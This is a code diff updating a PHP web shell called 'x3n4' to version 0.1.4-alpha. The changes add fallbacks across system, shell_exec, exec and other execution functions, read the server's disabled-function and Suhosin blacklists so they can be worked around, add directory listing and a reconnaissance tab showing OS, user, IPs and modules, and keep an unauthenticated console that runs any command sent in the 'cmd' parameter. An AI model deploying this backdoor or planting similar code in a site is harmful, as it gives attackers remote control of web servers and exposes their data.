@@ -1,12 +1,106 @@
 <?php
 
-define('X3N4_VERSION', 'v0.1.3-alpha');
+define('X3N4_VERSION', 'v0.1.4-alpha');
 
 session_start();
 
+/**
+ * Functions
+ */
 function get_shell_prefix()
 {
     return get_current_user() . '@' . php_uname('n') . ':' . getcwd() . ' $';
+}
+function get_shell_command()
+{
+    static $shell_command;
+
+    if ($shell_command === null) {
+        if (is_callable('system')) {
+            $shell_command = 'system';
+        } elseif (is_callable('shell_exec')) {
+            $shell_command = 'shell_exec';
+        } elseif (is_callable('exec')) {
+            $shell_command = 'exec';
+        } elseif (is_callable('passthru')) {
+            $shell_command = 'passthru';
+        } elseif (is_callable('proc_open')) {
+            $shell_command = 'proc_open';
+        } elseif (is_callable('popen')) {
+            $shell_command = 'popen';
+        }
+    }
+
+    return $shell_command;
+}
+function execute_command($command)
+{
+    switch (get_shell_command()) {
+        case 'system':
+            ob_start();
+            @system($command);
+            $return = ob_get_contents();
+            ob_end_clean();
+            return $return;
+
+        case 'shell_exec':
+            return @shell_exec($command);
+
+        default:
+            return 'None available function to run your command, sorry. :(';
+    }
+}
+function disabled_functions()
+{
+    static $disabled_fn;
+
+    if ($disabled_fn === null) {
+        $df = ini_get('disable_functions');
+        $shfb = ini_get('suhosin.executor.func.blacklist');
+        $fn_list = array_map('trim', explode(',', "$df,$shfb"));
+        $disabled_fn = array_filter($fn_list, create_function('$value', 'return $value !== "";'));
+    }
+
+    return $disabled_fn;
+}
+function is_function_disabled($function)
+{
+    return in_array($function, disabled_functions());
+}
+function tree($dir)
+{
+    $ffs = scandir($dir);
+
+    unset($ffs[array_search('.', $ffs, true)]);
+    unset($ffs[array_search('..', $ffs, true)]);
+
+    // prevent empty ordered elements
+    if (count($ffs) < 1) {
+        return;
+    }
+
+    echo '<ol>';
+    foreach ($ffs as $ff) {
+        echo '<li>', $ff;
+        if (is_dir($dir.'/'.$ff)) {
+            tree($dir.'/'.$ff);
+        }
+        echo '</li>';
+    }
+    echo '</ol>';
+}
+function list_folder_files($dir)
+{
+    $files = scandir($dir);
+    $data = array();
+    foreach ($files as $file) {
+        array_push($data, array(
+            'filename' => $file,
+            'type' => is_dir($file) ? 'folder' : 'file',
+            'fullpath' => realpath($file),
+        ));
+    }
+    return $data;
 }
 function output_json($output = '')
 {
@@ -19,13 +113,21 @@ function output_json($output = '')
     session_write_close();
     exit(0);
 }
+
+/**
+ * CORE
+ */
 if (!empty($_SESSION['pwd'])) {
     chdir($_SESSION['pwd']);
 }
+
 if (isset($_REQUEST['cmd'])) {
     $REQUESTED_CMD = trim($_REQUEST['cmd']);
     if (empty($REQUESTED_CMD)) {
         exit(0);
+    }
+    if ($REQUESTED_CMD == 'dirl') {
+        output_json(list_folder_files('.'));
     }
     if ($REQUESTED_CMD == 'upgrade') {
         $options  = array('http' => array('user_agent' => 'custom user agent string'));
@@ -48,9 +150,13 @@ if (isset($_REQUEST['cmd'])) {
         }
     }
 
-    $output = shell_exec($_REQUEST['cmd'] . ' 2>&1');
+    $output = execute_command($_REQUEST['cmd'] . ' 2>&1');
     output_json($output);
 }
+
+/**
+ * HTML
+ */
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -64,6 +170,7 @@ if (isset($_REQUEST['cmd'])) {
     <!-- Bootstrap -->
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" rel="stylesheet">
+    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
 
     <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
     <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
@@ -84,15 +191,81 @@ if (isset($_REQUEST['cmd'])) {
             x3n4 <?php echo X3N4_VERSION; ?>
         </h1>
 
-        <pre id="stdout"><?php echo shell_exec('cat /etc/motd') . PHP_EOL; ?></pre>
+        <ul class="nav nav-tabs" role="tablist">
+            <li role="presentation"><a href="#information" aria-controls="information" role="tab" data-toggle="tab"><i class="fa fa-info-circle"></i> System information</a></li>
+            <li role="presentation" class="active"><a href="#console" aria-controls="console" role="tab" data-toggle="tab"><i class="fa fa-terminal"></i> Console</a></li>
+            <!-- <li role="presentation"><a href="#file-manager" aria-controls="file-manager" role="tab" data-toggle="tab"><i class="fa fa-file-code-o "></i> File manager</a></li> -->
+        </ul>
+        <p></p>
+        <div class="tab-content">
+            <div id="information" role="tabpanel" class="tab-pane table-responsive">
+                <table class="table">
+                    <tr>
+                        <td>System:</td>
+                        <td>
+                            <?php
+                            switch (PHP_OS) {
+                                case 'Linux':
+                                    $platform_icon = 'fa-linux';
+                                    break;
+                                case 'WINNT':
+                                    $platform_icon = 'fa-windows';
+                                    break;
+                                case 'Darwin':
+                                    $platform_icon = 'fa-osx';
+                                    break;
+                                default:
+                                    $platform_icon = 'fa-unknown';
+                            }
+                            ?>
+                            <i class="fa <?php echo $platform_icon; ?>"></i> <?php echo php_uname(); ?>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Current user:</td>
+                        <td><?php echo get_current_user(); ?></td>
+                    </tr>
+                    <tr>
+                        <td>Server IP:</td>
+                        <td><?php echo $_SERVER['SERVER_ADDR']; ?></td>
+                    </tr>
+                    <tr>
+                        <td>Client IP:</td>
+                        <td><?php echo $_SERVER['REMOTE_ADDR']; ?></td>
+                    </tr>
+                    <tr>
+                        <td>PHP Version:</td>
+                        <td><?php echo phpversion(); ?></td>
+                    </tr>
+                    <tr>
+                        <td>Installed modules:</td>
+                        <td><?php echo implode(', ', get_loaded_extensions()); ?></td>
+                    </tr>
+                    <tr>
+                        <td>Disabled functions:</td>
+                        <td><?php echo implode(', ', disabled_functions()); ?></td>
+                    </tr>
+                    <tr>
+                        <td>Shell function:</td>
+                        <td><?php echo get_shell_command(); ?></td>
+                </table>
+            </div>
 
-        <div class="form-group">
-            <div class="input-group">
-                <span class="input-group-addon hidden-xs" id="pwd"><?php echo get_shell_prefix(); ?></span>
-                <input type="text" id="stdin" class="form-control" />
-                <span class="input-group-btn">
-                    <button type="button" class="btn btn-default" id="btnExecCommand">Send</button>
-                </span>
+            <div id="console" role="tabpanel" class="tab-pane active">
+                <pre id="stdout"><?php echo shell_exec('cat /etc/motd') . PHP_EOL; ?></pre>
+                <div class="form-group">
+                    <div class="input-group">
+                        <span class="input-group-addon hidden-xs" id="pwd"><?php echo get_shell_prefix(); ?></span>
+                        <input type="text" id="stdin" class="form-control" />
+                        <span class="input-group-btn">
+                            <button type="button" class="btn btn-default" id="btnExecCommand">Send</button>
+                        </span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="file-manager" role="tabpanel" class="tab-pane">
+                <?php list_folder_files(__DIR__); ?>
             </div>
         </div>
     </div>
@@ -104,17 +277,22 @@ if (isset($_REQUEST['cmd'])) {
     <script>
         function x3n4 () {
             this.version = '<?php echo X3N4_VERSION; ?>';
+            this.script_path = '<?php echo $_SERVER['REQUEST_URI']; ?>';
             this.execCommand = function(command) {
                 if (command.trim() == 'clear') {
                     $('#stdout').html('');
                     return;
                 }
-                $.post('x3n4.php', {cmd: command}, function(data) {
-                    $('#stdout').append(data.banner + " " + command + "\n");
-                    if (data.stdout !== null) {
-                        $('#stdout').append(data.stdout + "\n");
+                $.post(this.script_path, {cmd: command}, function(data) {
+                    if (data.stdout) {
+                        $('#stdout').append(data.banner + " " + command + "\n");
+                        if (data.stdout !== null) {
+                            $('#stdout').append(data.stdout);
+                        }
+                        $('#pwd').html(data.banner);
+                    } else {
+                        $('#stdout').append(data);
                     }
-                    $('#pwd').html(data.banner);
                     $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                 });
             }
